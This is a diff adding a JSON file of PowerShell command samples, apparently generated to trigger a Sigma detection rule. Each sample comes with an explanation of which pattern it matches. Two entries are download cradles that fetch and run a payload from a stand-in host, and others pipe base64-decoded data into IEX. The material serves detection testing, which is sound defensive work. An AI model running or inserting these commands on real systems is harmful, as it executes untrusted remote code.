@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"IEX ([Convert]::FromBase64String('SQBFAFgAIAAoAFsA'))\"",
+    "explanation": "This command uses base64 encoding of the string 'IEX ([' and is structured to match the Sigma rule's detection criteria. It includes the encoded string in a PowerShell command line."
+  },
+  {
+    "output": "powershell.exe -c \"iex ([Convert]::FromBase64String('aQBlAHgAIAAoAFsA'))\"",
+    "explanation": "This command uses base64 encoding of the string 'iex ([' and is structured to match the Sigma rule's detection criteria. It uses the short option '-c' for '-Command' and is encoded to avoid direct string detection."
+  },
+  {
+    "output": "powershell.exe -Command \"iex (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\"",
+    "explanation": "This command uses the 'iex' cmdlet with the 'New-Object' command, which is part of the Sigma rule's detection patterns. It is structured to match the rule by using the 'iex (New' string pattern."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/payload.ps1')\"",
+    "explanation": "This command uses the 'IEX (New' string pattern, which is part of the Sigma rule's detection criteria. It is structured to match the rule by using the full form of the 'IEX' cmdlet."
+  },
+  {
+    "output": "powershell.exe -Command \"iex (['string'])\"",
+    "explanation": "This command uses the 'iex ([' string pattern, which is part of the Sigma rule's detection criteria. It is structured to match the rule by using the 'iex ([' string pattern."
+  }
+]
